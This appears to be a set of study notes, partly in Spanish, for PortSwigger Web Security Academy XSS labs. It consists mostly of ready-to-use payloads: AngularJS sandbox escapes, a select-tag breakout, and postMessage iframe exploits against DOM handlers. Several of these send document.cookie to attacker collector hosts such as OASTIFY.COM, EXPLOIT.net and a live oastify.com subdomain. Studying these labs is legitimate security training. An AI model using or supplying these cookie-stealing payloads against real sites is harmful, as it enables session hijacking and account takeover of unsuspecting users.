Indicators:
```java
<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
```

### Vulnerable AngularJS

```java
{{$on.constructor('alert(1)')()}}
```

```java
{{$on.constructor('document.location="https://OASTIFY.COM?c="+document.cookie')()}}
```

### Write Location search
```java
/product?productId=1&storeId=fuzzer"></select>fuzzer
```

```javascript
"></select><script>document.location='https://OASTIFY.COM/?domxss='+document.cookie</script>//
```

### DOM XSS JSON.parse web messages

```javascript
<script>
	window.addEventListener('message', function(e) {
		var img = document.createElement('img'), ACMEplayer = {element: img}, d;
		document.body.appendChild(img);
		try {
			d = JSON.parse(e.data);
		} catch(e) {
			return;
		}
		switch(d.type) {
			case "page-load":
				ACMEplayer.element.scrollIntoView();
				break;
			case "load-channel":
				ACMEplayer.element.src = d.url;
				break;
			case "player-height-changed":
				ACMEplayer.element.style.width = d.width + "px";
				ACMEplayer.element.style.height = d.height + "px";
				break;
			case "redirect":
				window.location.replace(d.redirectUrl);
				break;
		}
	}, false);
</script>
```

y en el server : 

```javascript
<iframe src="https://0a6800740474398f80cb03590060005e.web-security-academy.net/"
        onload='this.contentWindow.postMessage(
          JSON.stringify({
            type: "load-channel",
            url: "javascript:fetch(`https://tzwi4eohn1xy81l4n1bv40na016suii7.oastify.com/?c=`+encodeURIComponent(document.cookie))"
          }), "*")'>
</iframe>
```

Set an unsecured test cookie in browser using browser DEV tools console to use during tests for POC XSS

```java
document.cookie = "TopSecret=UnsecureCookieValue4Peanut2025";
```

### DOM XSS AddEventListener JavaScript URL

The exploit server hosted payload below includes the `https` string, and is successful in bypassing the `if` condition check:

```javascript
<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('javascript:document.location=`https://OASTIFY.COM?c=`+document.cookie','*')">
```

### DOM XSS AddEventListener Ads Message
In the `source code` we _**identify**_ the call using `addEventListener` and an element id `ads` being referenced.
en el server:
```java
<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://OASTIFY.COM?collector=`+btoa(document.cookie))>','*')">
```

### DOM-XSS LastviewedProduct Cookie
On exploit server add the following iframe to the body:
```javascript
<iframe src="https://TARGET.net/product?productId=1&'><script>fetch('https://EXPLOIT.net/log?c='%2bdocument.cookie)</script>" onload="if(!window.x)this.src='https://TARGET.net';window.x=1;">
</iframe>
```